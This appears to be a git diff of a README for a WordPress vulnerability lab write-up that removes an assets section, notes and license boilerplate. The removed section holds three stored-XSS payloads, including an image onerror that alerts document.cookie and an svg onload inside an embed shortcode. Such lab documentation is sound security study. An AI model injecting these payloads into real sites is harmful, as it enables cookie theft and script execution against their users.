@@ -41,12 +41,6 @@ Time spent: 20 hours spent in total
 - [ ] Affected source code: 
   - [Link 1](https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0)
 
-## Assets
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg
-[embed src='https:youtube.com/embed/12345/\x3csvg onload=alert(1)\x3e'[/embed]
-
-
 
 ## Resources
 
@@ -57,25 +51,5 @@ cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg
 - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 
-GIFs created with  ...
-ScreenToGif](https://www.screentogif.com/) for Windows
+GIFs created with [ScreenToGif](https://www.screentogif.com/) for Windows
 
-## Notes
-
-Setting up Vagrant and Kali was very hard and consumed most of my time.
-
-## License
-
-    Copyright [yyyy] [name of copyright owner]
-
-    Licensed under the Apache License, Version 2.0 (the "License");
-    you may not use this file except in compliance with the License.
-    You may obtain a copy of the License at
-
-        http://www.apache.org/licenses/LICENSE-2.0
-
-    Unless required by applicable law or agreed to in writing, software
-    distributed under the License is distributed on an "AS IS" BASIS,
-    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-    See the License for the specific language governing permissions and
-    limitations under the License.
